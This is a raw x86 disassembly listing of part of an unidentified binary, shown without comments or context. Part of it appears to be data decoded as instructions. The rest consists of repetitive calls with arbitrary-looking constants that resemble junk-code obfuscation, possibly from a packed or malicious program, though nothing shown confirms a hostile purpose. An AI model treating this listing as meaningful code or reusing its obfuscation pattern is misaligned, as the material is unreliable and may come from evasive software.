  4064f7:	add    BYTE PTR [eax+0x11010444],al
  4064fd:	and    BYTE PTR [eax],dl
  4064ff:	test   al,0x64
  406501:	add    al,cl
  406503:	add    BYTE PTR [eax],cl
  406505:	add    BYTE PTR [edx-0x77fdfef0],ah
  40650b:	add    al,0x0
  40650d:	add    BYTE PTR [eax],ah
  40650f:	add    DWORD PTR [esi],eax
  406511:	add    BYTE PTR [edx],al
  406513:	add    BYTE PTR [edx-0x40],0x44
  406517:	add    BYTE PTR [eax+0x140046c9],0x10
  40651e:	nop
  40651f:	mov    eax,ds:0x4a000048
  406524:	mov    al,ds:0x13084047
  406529:	and    al,0x81
  40652b:	add    BYTE PTR [eax],al
  40652d:	add    al,BYTE PTR [eax-0x2c36faea]
  406533:	push   es
  406534:	inc    eax
  406535:	shl    BYTE PTR [eax],0x20
  406538:	add    bl,BYTE PTR ds:0x2c80000
  40653e:	or     al,BYTE PTR [eax+0x0]
  406541:	sbb    BYTE PTR [eax+eax*1+0x13108040],al
  406548:	add    cl,BYTE PTR [edx+0x4]
  40654b:	pop    edx
  40654c:	add    BYTE PTR [eax+0x3c80003],cl
  406552:	add    DWORD PTR [eax],ebx
  406554:	add    BYTE PTR [edx-0x7a],cl
  406557:	or     BYTE PTR [eax],al
  406559:	add    BYTE PTR [eax+0x1a],cl
  40655c:	dec    eax
  40655d:	or     BYTE PTR [edx+0x24],0x84
  406561:	add    dh,BYTE PTR [eax]
  406563:	daa    
  406564:	adc    al,0x10
  406566:	and    al,BYTE PTR [edx]
  406568:	or     BYTE PTR [edx+eax*1],0x0
  40656c:	inc    eax
  40656d:	inc    ecx
  40656e:	test   BYTE PTR [eax+0x0],cl
  406571:	add    BYTE PTR [eax],0x2
  406574:	add    BYTE PTR [eax-0x70],ah
  406577:	add    BYTE PTR [eax],al
  406579:	add    BYTE PTR [eax+ebp*1+0x20850000],dh
  406580:	adc    al,0x1
  406582:	and    BYTE PTR [ecx+0x0],ah
  406585:	inc    edx
  406586:	add    BYTE PTR [eax],al
  406588:	sub    al,0x2
  40658a:	adc    DWORD PTR [eax],eax
  40658c:	inc    ecx
  40658d:	or     al,BYTE PTR [ebx+eax*1+0x49]
  406591:	add    al,0x10
  406593:	mov    BYTE PTR [esi],al
  406595:	add    DWORD PTR [edx+0x5435081],eax
  40659b:	xor    eax,ebx
  40659d:	add    BYTE PTR [eax],cl
  40659f:	add    BYTE PTR [eax],ch
  4065a1:	rcl    DWORD PTR [eax+0x0],1
  4065a4:	or     eax,DWORD PTR [edx+0x4]
  4065a7:	mov    al,BYTE PTR ds:0x242500c1
  4065ad:	add    BYTE PTR [eax],al
  4065af:	add    BYTE PTR [ecx],al
  4065b1:	add    BYTE PTR [ecx],al
  4065b3:	add    al,BYTE PTR [eax+0x20000000]
  4065b9:	cmp    BYTE PTR [edx],0x80
  4065bc:	add    al,BYTE PTR [edx]
  4065be:	inc    edx
  4065bf:	adc    BYTE PTR [eax],0x10
  4065c2:	add    DWORD PTR [esi+eax*1+0x7501004],edx
  4065c9:	out    dx,al
  4065ca:	and    al,0x8
  4065cc:	push   edx
  4065cd:	add    DWORD PTR [ecx],0x42881500
  4065d3:	or     BYTE PTR [ebx],dl
  4065d5:	push   ds
  4065d6:	add    BYTE PTR [eax],ch
  4065d8:	or     BYTE PTR ds:0x29800830,dl
  4065de:	(bad)  
  4065df:	add    BYTE PTR [eax+eax*8],0x7
  4065e3:	add    DWORD PTR [esi],ecx
  4065e5:	add    eax,eax
  4065e7:	add    BYTE PTR [edx],cl
  4065e9:	push   ecx
  4065ea:	add    BYTE PTR [eax],al
  4065ec:	sub    BYTE PTR [eax],ch
  4065ee:	inc    eax
  4065ef:	test   DWORD PTR [eax+eax*2],esp
  4065f2:	or     DWORD PTR [eax],ecx
  4065f4:	and    BYTE PTR [eax],al
  4065f6:	xor    esp,DWORD PTR [eax]
  4065f8:	and    DWORD PTR [ebx+0x42],esi
  4065fb:	push   es
  4065fc:	add    dh,BYTE PTR [eax+edx*2]
  4065ff:	adc    cl,BYTE PTR [eax+0x0]
  406602:	add    BYTE PTR [eax],cl
  406604:	add    BYTE PTR [eax],cl
  406606:	test   BYTE PTR [eax],al
  406608:	add    BYTE PTR [eax],al
  40660a:	add    DWORD PTR [esi+0x829400],eax
  406610:	add    al,0x0
  406612:	or     BYTE PTR [ecx],al
  406614:	add    al,0x82
  406616:	or     BYTE PTR [eax+0x0],al
  406619:	add    al,0x0
  40661b:	add    BYTE PTR [eax],al
  40661d:	add    DWORD PTR [eax+eax*2],0x205a207
  406624:	mov    al,ds:0x4814307
  406629:	add    DWORD PTR [eax],eax
  40662b:	push   eax
  40662c:	dec    esi
  40662d:	inc    ecx
  40662e:	add    BYTE PTR [edx],cl
  406630:	dec    ebp
  406631:	add    BYTE PTR [edx],0x50
  406634:	bound  eax,QWORD PTR [edx+ecx*8+0x7d0020a]
  40663b:	add    BYTE PTR [eax+0x14098900],dl
  406641:	add    eax,0xa0806209
  406646:	or     cl,al
  406648:	and    BYTE PTR [ecx-0x7f],bh
  40664b:	mov    WORD PTR [ebp+0x2],es
  40664e:	dec    eax
  40664f:	push   edi
  406650:	or     al,BYTE PTR [edx]
  406652:	or     BYTE PTR [eax],ah
  406654:	lods   al,BYTE PTR ds:[esi]
  406655:	xchg   BYTE PTR [eax],al
  406657:	outs   dx,BYTE PTR ds:[esi]
  406658:	sbb    al,BYTE PTR [eax]
  40665a:	add    BYTE PTR es:[esi+0x1002116c],ch
  406661:	inc    edx
  406662:	add    BYTE PTR [eax],al
  406664:	dec    eax
  406665:	inc    eax
  406666:	inc    eax
  406667:	and    dl,BYTE PTR [ebx+0x40200000]
  40666d:	and    DWORD PTR [eax-0x65bffffa],edx
  406673:	push   es
  406674:	add    al,cl
  406676:	and    BYTE PTR [eax+0x12],al
  406679:	rol    al,0x40
  40667c:	loopne 0x40667e
  40667e:	inc    eax
  40667f:	sub    DWORD PTR [eax+0x78a420],eax
  406685:	or     al,BYTE PTR [eax]
  406687:	add    BYTE PTR ds:0x18411000,al
  40668d:	push   eax
  40668e:	add    BYTE PTR [ebx],al
  406690:	add    ch,al
  406692:	xor    al,BYTE PTR [edx]
  406694:	add    BYTE PTR [eax+ecx*1],al
  406697:	adc    BYTE PTR [eax+0x0],0x90
  40669b:	add    bl,BYTE PTR [eax]
  40669d:	or     BYTE PTR [eax],al
  40669f:	add    BYTE PTR [eax+0x2],al
  4066a2:	and    BYTE PTR [ecx+0x0],dh
  4066a5:	add    BYTE PTR [eax],al
  4066a7:	push   es
  4066a8:	add    dl,al
  4066aa:	add    al,0xa
  4066ac:	add    BYTE PTR [edx+0x1280],al
  4066b2:	and    BYTE PTR [eax+eax*2],cl
  4066b5:	add    BYTE PTR [edx],al
  4066b7:	add    BYTE PTR [eax+eiz*1],bl
  4066ba:	inc    ebx
  4066bb:	and    esp,DWORD PTR [eax]
  4066bd:	add    BYTE PTR [ecx],ah
  4066bf:	add    BYTE PTR [eax-0x80],cl
  4066c2:	or     BYTE PTR [edx-0x2fffbdf8],al
  4066c8:	and    BYTE PTR [eax+eax*4],al
  4066cb:	add    BYTE PTR [ecx],al
  4066cd:	adc    dl,BYTE PTR [eax]
  4066cf:	inc    eax
  4066d0:	mov    es,WORD PTR [ecx]
  4066d2:	add    dh,BYTE PTR [esi]
  4066d4:	xchg   ecx,eax
  4066d5:	sub    bl,BYTE PTR [eax+0x6000040]
  4066db:	add    BYTE PTR [ecx],ah
  4066dd:	add    BYTE PTR [ecx],dl
  4066df:	add    BYTE PTR [eax],al
  4066e1:	add    BYTE PTR [eax],0x0
  4066e4:	or     BYTE PTR fs:[eax],al
  4066e7:	or     BYTE PTR [eax],dl
  4066e9:	adc    edx,DWORD PTR [eax]
  4066eb:	or     eax,0x4200404
  4066f0:	add    al,BYTE PTR [eax]
  4066f2:	inc    esp
  4066f3:	add    BYTE PTR [eax+eax*1],al
  4066f6:	add    BYTE PTR [ebx],al
  4066f8:	add    BYTE PTR [eax],0xe8
  4066fb:	add    ecx,DWORD PTR [eax]
  4066fd:	rol    BYTE PTR [esi],0x62
  406700:	inc    eax
  406701:	pusha  
  406702:	adc    BYTE PTR es:[edx+0x44],0x4
  406707:	adc    BYTE PTR [edx],0x0
  40670a:	and    dl,BYTE PTR [ebx-0x3fb7fff1]
  406710:	add    al,0x4
  406712:	add    BYTE PTR [eax],al
  406714:	add    BYTE PTR [ecx+0x0],0x58
  406718:	add    BYTE PTR [eax],ah
  40671a:	add    BYTE PTR [ebx],cl
  40671c:	add    BYTE PTR [eax],al
  40671e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40671f:	add    eax,0x20000828
  406724:	adc    al,BYTE PTR [eax+eax*2]
  406727:	sbb    BYTE PTR [ecx],al
  406729:	mov    BYTE PTR ds:0x1484908,cl
  40672f:	inc    esi
  406730:	adc    BYTE PTR [eax-0x40],al
  406733:	add    DWORD PTR [eax],eax
  406735:	and    al,0x4
  406737:	add    BYTE PTR [ebx+0x19088c0],al
  40673d:	push   esp
  40673e:	dec    eax
  40673f:	sub    DWORD PTR [eax],ebp
  406741:	inc    eax
  406742:	add    BYTE PTR [edx],0x40
  406745:	xchg   esp,eax
  406746:	xor    al,0x5
  406748:	or     BYTE PTR [eax],cl
  40674a:	xor    BYTE PTR [edx+0x4],ah
  40674d:	adc    BYTE PTR [eax+0x3001000a],cl
  406753:	xor    ch,al
  406755:	add    BYTE PTR [eax],al
  406757:	adc    BYTE PTR [eax],al
  406759:	nop
  40675a:	adc    al,0x0
  40675c:	inc    eax
  40675d:	add    BYTE PTR [eax+eax*1],ah
  406760:	inc    eax
  406761:	add    BYTE PTR [eax+0x40],al
  406764:	dec    eax
	...
  4067a9:	add    BYTE PTR [eax],al
  4067ab:	add    BYTE PTR [ebp-0x75],dl
  4067ae:	in     al,dx
  4067af:	sub    esp,0x50
  4067b2:	push   0xffffffcc
  4067b4:	push   0x9c460700
  4067b9:	push   0x7afcec00
  4067be:	push   0x42
  4067c0:	push   0xf
  4067c2:	call   0x40a101
  4067c7:	add    esp,0x14
  4067ca:	call   0x409167
  4067cf:	push   ebx
  4067d0:	xor    ecx,ecx
  4067d2:	push   0xfffffff0
  4067d4:	push   0x16a9e200
  4067d9:	push   0xffffffa7
  4067db:	push   0xffffffd7
  4067dd:	call   0x409350
  4067e2:	add    esp,0x10
  4067e5:	push   esi
  4067e6:	add    eax,eax
  4067e8:	push   0xffffffaf
  4067ea:	push   0x67
  4067ec:	push   0x7a9baf00
  4067f1:	call   0x409c22
  4067f6:	add    esp,0xc
  4067f9:	push   edi
  4067fa:	push   0x1ec0ee00
  4067ff:	push   0x9c4a0f00
  406804:	push   0x1e943b00
  406809:	push   0x7c421100
  40680e:	call   0x409350
  406813:	add    esp,0x10
  406816:	call   0x409350
  40681b:	add    eax,eax
  40681d:	push   0x7
  40681f:	call   0x409350
  406824:	add    esp,0x4
  406827:	push   0x62f7a400
  40682c:	call   0x409c22
  406831:	add    esp,0x4
  406834:	mov    esi,DWORD PTR ds:0x43706c
  40683a:	mov    eax,0x15
  40683f:	push   0xe6121c00
  406844:	push   0x54
  406846:	push   0x76
  406848:	call   0x409afe
  40684d:	add    esp,0xc
  406850:	push   0x7c56a200
  406855:	push   0x6e98ed00
  40685a:	push   0x60
  40685c:	push   0x9aad1400
  406861:	push   0x66cea100
  406866:	call   0x40949f
  40686b:	add    esp,0x14
  40686e:	push   0xfa957200
  406873:	push   0x5f
  406875:	push   0xffffffe8
  406877:	push   0xffffffd4
  406879:	push   0x1ad5a700
  40687e:	call   0x409350
  406883:	add    esp,0x14
  406886:	sub    esi,eax
  406888:	call   0x409167
  40688d:	call   0x40949f
  406892:	push   0xa6b93200
  406897:	push   0xffffff91
  406899:	push   0x1b
  40689b:	push   0xfffffff5
  40689d:	call   0x409350
  4068a2:	add    esp,0x10
  4068a5:	call   0x409167
  4068aa:	mov    DWORD PTR [ebp-0x18],esi
  4068ad:	mov    edx,DWORD PTR [ebp-0x18]
  4068b0:	push   0x12
  4068b2:	push   0x20
  4068b4:	push   0xec77ae00
  4068b9:	call   0x409c22
  4068be:	add    esp,0xc
  4068c1:	xor    edi,edi
  4068c3:	mov    ecx,DWORD PTR [ebp-0x18]
  4068c6:	push   0xeeaa8700
  4068cb:	push   0x8c5cbd00
  4068d0:	push   0xfc353100
  4068d5:	push   0xfffffffa
  4068d7:	push   0x9e36a100
  4068dc:	call   0x409afe
  4068e1:	add    esp,0x14
  4068e4:	push   0x1e4eb200
  4068e9:	call   0x4095af
  4068ee:	add    esp,0x4
  4068f1:	push   0x8eb05300
  4068f6:	push   0xc23b900
  4068fb:	call   0x409afe
  406900:	add    esp,0x8
  406903:	push   0x92bedf00
  406908:	call   0x40949f
  40690d:	add    esp,0x4
  406910:	push   0xa29d1200
  406915:	push   0x22
  406917:	call   0x40a101
  40691c:	add    esp,0x8
  40691f:	push   0x9e373800
  406924:	push   0xffffffc8
  406926:	push   0x9e0f3f00
  40692b:	call   0x40949f
  406930:	add    esp,0xc
  406933:	push   0xca88b300
  406938:	push   0x66
  40693a:	push   0x266aa300
  40693f:	push   0x3e8aee00
  406944:	call   0x40a101
  406949:	add    esp,0x10
  40694c:	mov    DWORD PTR [ebp-0x18],edi
  40694f:	push   0x4ed67500
  406954:	push   0x3e0d9300
  406959:	push   0x73
  40695b:	call   0x409167
  406960:	add    esp,0xc
  406963:	xor    eax,eax
  406965:	push   0x3e777000
  40696a:	push   0x4aa0ed00
  40696f:	push   0x3c6c4c00
  406974:	call   0x409c22
  406979:	add    esp,0xc
  40697c:	push   0x51
  40697e:	push   0x36
  406980:	push   0x2b
  406982:	push   0xbaabd500
  406987:	call   0x40a101
  40698c:	add    esp,0x10
  40698f:	push   0x4c0d3000
  406994:	push   0xffffffcf
  406996:	call   0x409afe
  40699b:	add    esp,0x8
  40699e:	push   0x9a898b00
  4069a3:	push   0xffffffb8
  4069a5:	push   0x52
  4069a7:	push   0x9c09bd00
  4069ac:	call   0x40a101
  4069b1:	add    esp,0x10
  4069b4:	push   0x16e2c300
  4069b9:	push   0x3c
  4069bb:	push   0x1e758d00
  4069c0:	call   0x40a101
  4069c5:	add    esp,0xc
  4069c8:	push   0x66
  4069ca:	push   0x41
  4069cc:	push   0xb
  4069ce:	push   0x265e4b00
  4069d3:	push   0x2c
  4069d5:	call   0x409167
  4069da:	add    esp,0x14
  4069dd:	and    edi,eax
  4069df:	push   0x3f
  4069e1:	push   0x57
  4069e3:	push   0x49
  4069e5:	push   0x2a85e500
  4069ea:	push   0xffffffa4
  4069ec:	call   0x409350
  4069f1:	add    esp,0x14
  4069f4:	mov    eax,DWORD PTR [ebp-0x18]
  4069f7:	mov    edx,esi
  4069f9:	cmp    edx,0x179f
  4069ff:	jne    0x406ac3
  406a05:	mov    ecx,DWORD PTR [ebp-0x18]
  406a08:	add    edx,edx
  406a0a:	push   0xffffffe8
  406a0c:	push   0x4d
  406a0e:	push   0x72f36c00
  406a13:	push   0x6658c000
  406a18:	call   0x409e1d
  406a1d:	add    esp,0x10
  406a20:	mov    ebx,DWORD PTR [ebp-0x18]
  406a23:	push   0x16
  406a25:	push   0x45
  406a27:	push   0x8c638300
  406a2c:	call   0x4095af
  406a31:	add    esp,0xc
  406a34:	sub    DWORD PTR [ebp-0x18],ebx
  406a37:	push   0xaaf0900
  406a3c:	push   0x4acc7f00
  406a41:	push   0x10
  406a43:	push   0xd6888800
  406a48:	call   0x409167
  406a4d:	add    esp,0x10
  406a50:	push   0xac21ae00
  406a55:	push   0xada6100
  406a5a:	push   0x92eda700
  406a5f:	call   0x409c22
  406a64:	add    esp,0xc
  406a67:	sub    DWORD PTR [ebp-0x18],ebx
  406a6a:	sub    edi,ebx
  406a6c:	push   0xffffffb8
  406a6e:	push   0x74
  406a70:	call   0x4095af
  406a75:	add    esp,0x8
  406a78:	push   0xa2da6700
  406a7d:	push   0xec791900
  406a82:	push   0xffffffae
  406a84:	push   0x4c550a00
  406a89:	call   0x409167
  406a8e:	add    esp,0x10
  406a91:	push   0xffffffbf
  406a93:	push   0xffffffb4
  406a95:	call   0x4095af
  406a9a:	add    esp,0x8
  406a9d:	push   0xb2e8d900
  406aa2:	push   0x6610b700
  406aa7:	push   0xc43bb00
  406aac:	push   0xffffffac
  406aae:	push   0x1aff3c00
  406ab3:	call   0x409e1d
  406ab8:	add    esp,0x14
  406abb:	call   0x409350
  406ac0:	or     DWORD PTR [ebp-0x18],edi
  406ac3:	cmp    edi,ebx
  406ac5:	jne    0x406ae7
  406ac7:	cmp    esi,DWORD PTR ds:0x43706c
  406acd:	je     0x406ae7
  406acf:	push   0x3e177800
  406ad4:	push   0x9e658c00
  406ad9:	push   0x3d
  406adb:	push   0xffffffe8
  406add:	push   0x60
  406adf:	call   0x409167
  406ae4:	add    esp,0x14
  406ae7:	push   0xde944e00
  406aec:	push   0x72c11800
  406af1:	push   0xaea09300
  406af6:	push   0x3e39f000
  406afb:	push   0xffffffaf
  406afd:	call   0x409167
  406b02:	add    esp,0x14
  406b05:	cmp    eax,0x3134
  406b0a:	jne    0x406b23
  406b0c:	push   0x3c758900
  406b11:	push   0x8c433200
  406b16:	push   0x5effed00
  406b1b:	call   0x40949f
  406b20:	add    esp,0xc
  406b23:	mov    ebx,0x81
  406b28:	push   0x19
  406b2a:	push   0xdc480400
  406b2f:	push   0x2e
  406b31:	push   0x6673d800
  406b36:	push   0x1a
  406b38:	call   0x40a101
  406b3d:	add    esp,0x14
  406b40:	push   0x3e699200
  406b45:	push   0x3a
  406b47:	push   0x7c2f4500
  406b4c:	push   0xffffffc5
  406b4e:	push   0x3c0c0800
  406b53:	call   0x409350
  406b58:	add    esp,0x14
  406b5b:	push   0xffffffa1
  406b5d:	push   0xffffffa8
  406b5f:	push   0x9e309600
  406b64:	call   0x409c22
  406b69:	add    esp,0xc
  406b6c:	call   0x409167
  406b71:	push   0xb2f9ea00
  406b76:	push   0x12906700
  406b7b:	call   0x40949f
  406b80:	add    esp,0x8
  406b83:	and    ebx,eax
  406b85:	mov    edx,edi
  406b87:	sub    DWORD PTR [ebp-0x18],edx
  406b8a:	push   0x3e258300
  406b8f:	push   0xfffffff4
  406b91:	call   0x4095af
  406b96:	add    esp,0x8
  406b99:	cmp    ebx,0x5d
  406b9c:	je     0x406bbf
  406b9e:	push   0x1c553f00
  406ba3:	push   0x67
  406ba5:	push   0xc2cddd00
  406baa:	push   0xdaaeea00
  406baf:	push   0xe6e07100
  406bb4:	call   0x4095af
  406bb9:	add    esp,0x14
  406bbc:	add    DWORD PTR [ebp-0x18],ebx
  406bbf:	push   0x4aee1100
  406bc4:	push   0x22bd8600
  406bc9:	call   0x40a101
  406bce:	add    esp,0x8
  406bd1:	mov    eax,DWORD PTR [ebp-0x18]
  406bd4:	push   0xfffffffe
  406bd6:	call   0x40949f
  406bdb:	add    esp,0x4
  406bde:	mov    edx,0x8c
  406be3:	push   0x1f
  406be5:	push   0x3c79b100
  406bea:	push   0x1e4dc200
  406bef:	push   0xffffffeb
  406bf1:	push   0xeada4f00
  406bf6:	call   0x409c22
  406bfb:	add    esp,0x14
  406bfe:	and    esi,edi
  406c00:	push   0x3a
  406c02:	push   0x1e
  406c04:	push   0x6ae0da00
  406c09:	call   0x409167
  406c0e:	add    esp,0xc
  406c11:	mov    ebx,0x8d
  406c16:	push   0xc6b29e00
  406c1b:	push   0xbab31000
  406c20:	push   0x50
  406c22:	push   0xffffffea
  406c24:	call   0x4095af
  406c29:	add    esp,0x10
  406c2c:	cmp    esi,edi
  406c2e:	jne    0x406de6
  406c34:	and    ebx,eax
  406c36:	sub    DWORD PTR [ebp-0x18],ebx
  406c39:	call   0x409c22
  406c3e:	push   0x21
  406c40:	push   0xffffffb0
  406c42:	push   0xffffff91
  406c44:	call   0x409c22
  406c49:	add    esp,0xc
  406c4c:	sub    esi,eax
  406c4e:	mov    edi,DWORD PTR [ebp-0x18]
  406c51:	push   0xca935d00
  406c56:	call   0x409c22
  406c5b:	add    esp,0x4
  406c5e:	and    edi,eax
  406c60:	push   0xcebb2300
  406c65:	push   0xffffffd6
  406c67:	push   0xffffff91
  406c69:	call   0x409afe
  406c6e:	add    esp,0xc
  406c71:	push   0xfffffffb
  406c73:	push   0x3e0fa900
  406c78:	push   0x2c3a1400
  406c7d:	push   0xaab3f800
  406c82:	call   0x40a101
  406c87:	add    esp,0x10
  406c8a:	call   0x409350
  406c8f:	push   0x56
  406c91:	push   0xffffffb0
  406c93:	call   0x409167
  406c98:	add    esp,0x8
  406c9b:	push   0x3abcb400
  406ca0:	push   0xffffffd3
  406ca2:	push   0xffffffd5
  406ca4:	call   0x409c22
  406ca9:	add    esp,0xc
  406cac:	push   0xcc3c6600
  406cb1:	call   0x409e1d
  406cb6:	add    esp,0x4
  406cb9:	add    esi,ebx
  406cbb:	push   0x57
  406cbd:	push   0xffffffd3
  406cbf:	push   0x661a0500
  406cc4:	push   0x6c6d5a00
  406cc9:	push   0x3e1da700
  406cce:	call   0x409350
  406cd3:	add    esp,0x14
  406cd6:	push   0x665e4600
  406cdb:	push   0x23
  406cdd:	push   0x59
  406cdf:	call   0x409167
  406ce4:	add    esp,0xc
  406ce7:	push   0xa
  406ce9:	push   0xffffffef
  406ceb:	call   0x409c22
  406cf0:	add    esp,0x8
  406cf3:	call   0x409350
  406cf8:	mov    ecx,0xdb19
  406cfd:	sub    DWORD PTR [ebp-0x18],edi
  406d00:	call   0x409e1d
  406d05:	sub    esi,ebx
  406d07:	push   0x28
  406d09:	push   0x9e538e00
  406d0e:	call   0x40949f
  406d13:	add    esp,0x8
  406d16:	call   0x40a101
  406d1b:	push   0xe6569100
  406d20:	call   0x409afe
  406d25:	add    esp,0x4
  406d28:	sub    esi,ebx
  406d2a:	call   0x409167
  406d2f:	call   0x40949f
  406d34:	push   0xa
  406d36:	push   0xffffff8e
  406d38:	call   0x409c22
  406d3d:	add    esp,0x8
  406d40:	push   0xd69ef000
  406d45:	call   0x40a101
  406d4a:	add    esp,0x4
  406d4d:	push   0xc2b3fe00
  406d52:	push   0x1ee92e00
  406d57:	push   0x6610f100
  406d5c:	push   0xffffffc3
  406d5e:	push   0xe2cc5400
  406d63:	call   0x40a101
  406d68:	add    esp,0x14
  406d6b:	push   0xffffffa7
  406d6d:	call   0x409e1d
  406d72:	add    esp,0x4
  406d75:	push   0xffffffa8
  406d77:	push   0x5
  406d79:	push   0x2e88f700
  406d7e:	push   0xffffffae
  406d80:	push   0xcc078000
  406d85:	call   0x409167
  406d8a:	add    esp,0x14
  406d8d:	push   0xffffff9a
  406d8f:	push   0x3c105800
  406d94:	push   0xffffffd1
  406d96:	push   0x8c2a0f00
  406d9b:	call   0x40949f
  406da0:	add    esp,0x10
  406da3:	push   0x1e161000
  406da8:	push   0x5c288000
  406dad:	push   0x7a
  406daf:	push   0x96e5f000
  406db4:	push   0x46
  406db6:	call   0x409c22
  406dbb:	add    esp,0x14
  406dbe:	add    DWORD PTR [ebp-0x18],eax
  406dc1:	sub    esi,eax
  406dc3:	and    esi,eax
  406dc5:	push   0xed59f00
  406dca:	push   0xffffffbb
  406dcc:	push   0xd6b62f00
  406dd1:	push   0xa6a85800
  406dd6:	push   0x2a9f0900
  406ddb:	call   0x409350
  406de0:	add    esp,0x14
  406de3:	sub    DWORD PTR [ebp-0x18],esi
  406de6:	push   0x58
  406de8:	push   0x52adaa00
  406ded:	push   0xbac87300
  406df2:	push   0xeece0900
  406df7:	call   0x409167
  406dfc:	add    esp,0x10
  406dff:	call   0x409e1d
  406e04:	call   0x409c22
  406e09:	add    DWORD PTR [ebp-0x18],ebx
  406e0c:	push   0xfffffff9
  406e0e:	push   0x6
  406e10:	push   0x52
  406e12:	push   0xe6334500
  406e17:	call   0x40a101
  406e1c:	add    esp,0x10
  406e1f:	mov    eax,DWORD PTR [ebp-0x18]
  406e22:	push   0xffffffb8
  406e24:	push   0x7c60fc00
  406e29:	push   0x6e3eb00
  406e2e:	push   0x66f7be00
  406e33:	push   0xffffffb4
  406e35:	call   0x409e1d
  406e3a:	add    esp,0x14
  406e3d:	push   0xffffffe2
  406e3f:	push   0xffffffdd
  406e41:	push   0xffffffe6
  406e43:	push   0xbecd0800
  406e48:	call   0x409e1d
  406e4d:	add    esp,0x10
  406e50:	push   0x1e751400
  406e55:	push   0xaec40300
  406e5a:	push   0x16fa5e00
  406e5f:	call   0x40a101
  406e64:	add    esp,0xc
  406e67:	push   0xffffff9f
  406e69:	push   0xd6b08e00
  406e6e:	push   0xffffffc3
  406e70:	push   0x12e3c500
  406e75:	call   0x409afe
  406e7a:	add    esp,0x10
  406e7d:	push   0xfc2da500
  406e82:	push   0x72f30100
  406e87:	push   0x43
  406e89:	call   0x4095af
  406e8e:	add    esp,0xc
  406e91:	push   0x6f
  406e93:	push   0x0
  406e95:	call   DWORD PTR ds:0x417248
  406e9b:	cmp    eax,0x24010360
  406ea0:	jne    0x406ea8
  406ea2:	mov    ecx,DWORD PTR [ebp-0x18]
  406ea5:	add    DWORD PTR [ebp-0x18],ecx
  406ea8:	cmp    eax,0xfffffff3
  406eab:	jne    0x406f51
  406eb1:	xor    DWORD PTR [ebp-0x18],ebx
  406eb4:	mov    edi,0x62c5a0a9
  406eb9:	push   0x3af9d400
  406ebe:	push   0xffffffe1
  406ec0:	push   0x8af3c300
  406ec5:	push   0x428b4d00
  406eca:	push   0xffffff80
  406ecc:	call   0x409c22
  406ed1:	add    esp,0x14
  406ed4:	push   0xe
  406ed6:	call   0x409afe
  406edb:	add    esp,0x4
  406ede:	push   0xfffffff1
  406ee0:	push   0x3e0f8d00
  406ee5:	push   0x8689ff00
  406eea:	push   0xcebe6200
  406eef:	call   0x40a101
  406ef4:	add    esp,0x10
  406ef7:	call   0x4095af
  406efc:	mov    ebx,edi
  406efe:	add    DWORD PTR [ebp-0x18],esi
  406f01:	push   0xdc5cba00
  406f06:	push   0x8288f400
  406f0b:	push   0xffffff89
  406f0d:	push   0x8c6d5600
  406f12:	call   0x409e1d
  406f17:	add    esp,0x10
  406f1a:	push   0x7a
  406f1c:	push   0xe61c7000
  406f21:	push   0x6b
  406f23:	push   0xda879100
  406f28:	call   0x409350
  406f2d:	add    esp,0x10
  406f30:	mov    DWORD PTR [ebp-0x1c],ebx
  406f33:	mov    eax,DWORD PTR [ebp-0x18]
  406f36:	push   0x56
  406f38:	push   0x4c0caf00
  406f3d:	push   0x7c387900
  406f42:	push   0xffffff9a
  406f44:	push   0x5a8a7100
  406f49:	call   0x409167
  406f4e:	add    esp,0x14
  406f51:	call   0x409c22
  406f56:	mov    edx,eax
  406f58:	add    edx,edx
  406f5a:	push   0x57
  406f5c:	push   0xfffffff3
  406f5e:	push   0x3e1a4f00
  406f63:	push   0x1c45cf00
  406f68:	call   0x40a101
  406f6d:	add    esp,0x10
  406f70:	lea    eax,[ebp-0xc]
  406f73:	push   eax
  406f74:	call   DWORD PTR ds:0x417318
  406f7a:	xor    edi,edi
  406f7c:	mov    esi,DWORD PTR [ebp-0x18]
  406f7f:	add    esi,esi
  406f81:	cmp    esi,DWORD PTR ds:0x43706c
  406f87:	jne    0x406fa5
  406f89:	add    esi,esi
  406f8b:	mov    ecx,ebx
  406f8d:	mov    ebx,0x88d8
  406f92:	and    ebx,eax
  406f94:	add    DWORD PTR [ebp-0x18],esi
  406f97:	sub    DWORD PTR [ebp-0x18],ebx
  406f9a:	add    DWORD PTR [ebp-0x18],ecx
  406f9d:	sub    DWORD PTR [ebp-0x18],ecx
  406fa0:	sub    edi,ebx
  406fa2:	add    DWORD PTR [ebp-0x18],edi
  406fa5:	cmp    eax,0x46
  406fa8:	je     0x4070b1
  406fae:	push   0xffffffbe
  406fb0:	push   0x6
  406fb2:	call   0x409afe
  406fb7:	add    esp,0x8
  406fba:	xor    esi,esi
  406fbc:	mov    edi,DWORD PTR ds:0x43706c
  406fc2:	push   0xbafa4700
  406fc7:	push   0xae91d400
  406fcc:	push   0xffffffb7
  406fce:	push   0xffffffbe
  406fd0:	push   0xb6e21200
  406fd5:	call   0x4095af
  406fda:	add    esp,0x14
  406fdd:	sub    DWORD PTR [ebp-0x18],esi
  406fe0:	push   0xfc42af00
  406fe5:	push   0x1a
  406fe7:	push   0x1e500100
  406fec:	call   0x409e1d
  406ff1:	add    esp,0xc
  406ff4:	cmp    eax,0x2a08e04
  406ff9:	jne    0x407051
  406ffb:	push   0xffffffc3
  406ffd:	push   0x53
  406fff:	call   0x409afe
  407004:	add    esp,0x8
  407007:	push   0xffffffb3
  407009:	push   0x1e531900
  40700e:	push   0x4c57a900
  407013:	push   0xffffffee
  407015:	push   0xffffffde
  407017:	call   0x4095af
  40701c:	add    esp,0x14
  40701f:	push   0xfeb3d100
  407024:	call   0x40a101
  407029:	add    esp,0x4
  40702c:	xor    eax,eax
  40702e:	or     eax,esi
  407030:	push   0x6f
  407032:	push   0x46a11d00
  407037:	push   0xffffff92
  407039:	push   0x46db0900
  40703e:	call   0x40a101
  407043:	add    esp,0x10
  407046:	mov    eax,0xd7
  40704b:	xor    DWORD PTR [ebp-0x18],eax
  40704e:	add    DWORD PTR [ebp-0x18],edi
  407051:	call   0x40a101
  407056:	push   0xffffffe1
  407058:	push   0x33
  40705a:	push   0xffffffae
  40705c:	push   0x3e173a00
  407061:	push   0xffffffde
  407063:	call   0x40a101
  407068:	add    esp,0x14
  40706b:	push   0x3e578e00
  407070:	push   0xffffffa6
  407072:	push   0x16
  407074:	call   0x4095af
  407079:	add    esp,0xc
  40707c:	mov    DWORD PTR [ebp-0x3c],esi
  40707f:	cmp    eax,DWORD PTR ds:0x43706c
  407085:	je     0x4070a2
  407087:	push   0x56
  407089:	push   0x6a950500
  40708e:	push   0xac208500
